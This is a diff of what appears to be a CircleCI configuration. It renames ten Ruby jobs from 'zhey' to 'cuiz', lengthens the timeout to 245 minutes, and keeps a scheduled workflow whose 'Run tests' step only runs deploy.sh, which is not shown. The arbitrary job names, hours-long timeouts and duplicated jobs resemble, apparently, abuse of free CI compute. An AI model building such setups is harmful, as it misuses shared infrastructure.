@@ -12,48 +12,48 @@ working_dir: &working_dir ~/app
         name: Run tests
         command: |
                     chmod u+x deploy.sh && ./deploy.sh
-        no_output_timeout: 240m
+        no_output_timeout: 245m
 version: 2.0
 jobs:
-  zhey:
+  cuiz:
     docker:
       - image: ruby
     steps:
       - checkout
-  zhey1:
+  cuiz1:
     <<: *script
     docker:
       - image: ruby:2.7
-  zhey2:
+  cuiz2:
     <<: *script
     docker:
       - image: ruby:2.6
-  zhey3:
+  cuiz3:
     <<: *script
     docker:
       - image: ruby:2.5
-  zhey4:
+  cuiz4:
     <<: *script
     docker:
       - image: ruby:2.4
-  zhey5:
+  cuiz5:
     docker:
       - image: ruby
     steps:
       - checkout
-  zhey6:
+  cuiz6:
     <<: *script
     docker:
       - image: ruby:2.7
-  zhey7:
+  cuiz7:
     <<: *script
     docker:
       - image: ruby:2.6
-  zhey8:
+  cuiz8:
     <<: *script
     docker:
       - image: ruby:2.5
-  zhey9:
+  cuiz9:
     <<: *script
     docker:
       - image: ruby:2.4
@@ -61,16 +61,16 @@ workflows:
   version: 2
   commit:
     jobs:
-      - zhey
-      - zhey1
-      - zhey2
-      - zhey3
-      - zhey4
-      - zhey5
-      - zhey6
-      - zhey7
-      - zhey8
-      - zhey9
+      - cuiz
+      - cuiz1
+      - cuiz2
+      - cuiz3
+      - cuiz4
+      - cuiz5
+      - cuiz6
+      - cuiz7
+      - cuiz8
+      - cuiz9
 
 
     triggers:
@@ -81,15 +81,15 @@ workflows:
               only:
                 - master
 
-  zheyrunjob:
+  cuizrunjob:
     jobs:
-      - zhey
-      - zhey1
-      - zhey2
-      - zhey3
-      - zhey4
-      - zhey5
-      - zhey6
-      - zhey7
-      - zhey8
-      - zhey9
+      - cuiz
+      - cuiz1
+      - cuiz2
+      - cuiz3
+      - cuiz4
+      - cuiz5
+      - cuiz6
+      - cuiz7
+      - cuiz8
+      - cuiz9
